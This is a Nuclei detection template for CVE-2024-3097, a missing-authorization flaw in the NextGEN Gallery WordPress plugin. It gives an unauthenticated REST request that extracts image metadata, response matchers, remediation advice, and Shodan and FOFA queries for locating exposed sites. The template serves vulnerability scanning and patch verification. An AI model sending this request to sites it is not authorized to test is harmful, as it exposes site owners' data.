id: CVE-2024-3097

info:
  name: NextGEN Gallery <= 3.59 - Missing Authorization to Unauthenticated Information Disclosure
  author: DhiyanesDK
  severity: medium
  description: |
    The WordPress Gallery Plugin â€“ NextGEN Gallery plugin for WordPress is vulnerable to unauthorized access of data due to a missing capability check on the get_item function in versions up to, and including, 3.59. This makes it possible for unauthenticated attackers to extract sensitive data including EXIF and other metadata of any image uploaded through the plugin.
  impact: |
    Unauthenticated attackers can perform unauthorized actions within the NextGEN Gallery plugin.
  remediation: |
    Update NextGEN Gallery to version 3.60 or later.
  reference:
    - https://plugins.trac.wordpress.org/browser/nextgen-gallery/trunk/src/REST/Admin/Block.php#L40
    - https://www.wordfence.com/threat-intel/vulnerabilities/id/75f87f99-9f0d-46c2-a6f1-3c1ea0176303?source=cve
    - https://zpbrent.github.io/pocs/8-plugin-nextgen-gallery-InfoDis-20240327.mp4
    - https://github.com/fkie-cad/nvd-json-data-feeds
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
    cvss-score: 5.3
    cve-id: CVE-2024-3097
    cwe-id: CWE-862
    epss-score: 0.27418
    epss-percentile: 0.96244
    cpe: cpe:2.3:a:imagely:nextgen_gallery:*:*:*:*:*:wordpress:*:*
  metadata:
    max-request: 1
    vendor: imagely
    product: "nextgen_gallery"
    framework: wordpress
    shodan-query:
      - "cpe:\"cpe:2.3:a:imagely:nextgen_gallery\""
      - http.html:/wp-content/plugins/nextgen-gallery/
    fofa-query: "body=/wp-content/plugins/nextgen-gallery/"
    publicwww-query: "/wp-content/plugins/nextgen-gallery/"
  tags: cve,cve2024,wordpress,nextgen-gallery,wp-plugin,info-leak,imagely,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/wp-json/ngg/v1/admin/block/image/1"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"success":'
          - '"image":'
        condition: and

      - type: word
        part: header
        words:
          - 'application/json'

      - type: status
        status:
          - 200
# digest: 4a0a00473045022038bf4f93db8f3764c44b89ad475e5a3ae0ea2e3843261fd90c835fc784e636f3022100b00c634e9dbdf5f7a72df6033f70b0f2c26bdddf8d479b983a74dcde21e7ae91:922c64590222798bb761d5b6d8e72950